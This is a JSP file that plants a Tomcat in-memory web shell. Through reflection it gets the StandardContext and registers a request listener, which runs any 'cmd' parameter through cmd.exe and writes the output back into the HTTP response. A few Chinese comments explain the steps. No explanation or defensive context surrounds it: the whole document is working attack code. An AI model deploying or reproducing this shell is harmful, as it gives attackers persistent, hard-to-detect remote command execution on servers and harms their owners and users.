<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>

<%!
public class MyListener implements ServletRequestListener {
	public void requestDestroyed(ServletRequestEvent sre) {
		HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
		if (req.getParameter("cmd") != null){
		InputStream in = null;
		try {
			in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
			Scanner s = new Scanner(in).useDelimiter("\\A");
			String out = s.hasNext()?s.next():"";

			// 获取 request 对象,输出回显到servlet
			Field requestF = req.getClass().getDeclaredField("request");
			requestF.setAccessible(true);
			Request request = (Request)requestF.get(req);
			request.getResponse().getWriter().write(out);
		}
		catch (IOException e) {}
		catch (NoSuchFieldException e) {}
		catch (IllegalAccessException e) {}
		}
	}
	public void requestInitialized(ServletRequestEvent sre) {}
}
%>

<%
	// 获取 StandardContext 对象
	Field reqF = request.getClass().getDeclaredField("request");
	reqF.setAccessible(true);
	Request req = (Request) reqF.get(request);
	StandardContext context = (StandardContext) req.getContext();

	MyListener listenerDemo = new MyListener();
	context.addApplicationEventListener(listenerDemo);
%>